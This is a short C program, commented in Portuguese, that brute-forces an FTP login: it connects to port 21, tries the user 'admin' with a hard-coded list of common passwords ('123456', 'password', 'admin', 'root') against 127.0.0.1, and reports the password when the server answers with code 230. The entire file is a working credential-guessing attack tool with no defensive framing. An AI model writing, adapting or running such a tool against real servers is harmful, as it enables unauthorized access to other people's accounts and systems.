#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

int try_ftp_login(char *ip, char *user, char *pass) {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];
    char login_cmd[128];

    // Criando o socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Erro ao criar socket\n");
        return -1;
    }

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(21);

    // Tentativa de conexão
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Não foi possível conectar ao servidor FTP\n");
        return -1;
    }

    // Recebendo banner
    read(sock, buffer, 1024);
    
    // Enviando nome de usuário
    snprintf(login_cmd, sizeof(login_cmd), "USER %s\r\n", user);
    write(sock, login_cmd, strlen(login_cmd));
    read(sock, buffer, 1024);

    // Enviando senha
    snprintf(login_cmd, sizeof(login_cmd), "PASS %s\r\n", pass);
    write(sock, login_cmd, strlen(login_cmd));
    read(sock, buffer, 1024);

    // Verificando resposta
    if (strstr(buffer, "230")) {
        printf("[+] Senha correta: %s\n", pass);
        close(sock);
        return 0;
    }

    close(sock);
    return -1;
}

int main(int argc, char *argv[]) {
    char *ip = "127.0.0.1";
    char *user = "admin";
    char *passwords[] = {"123456", "password", "admin", "root", NULL};

    int i = 0;
    while (passwords[i] != NULL) {
        if (try_ftp_login(ip, user, passwords[i]) == 0) {
            break;
        }
        i++;
    }

    return 0;
}
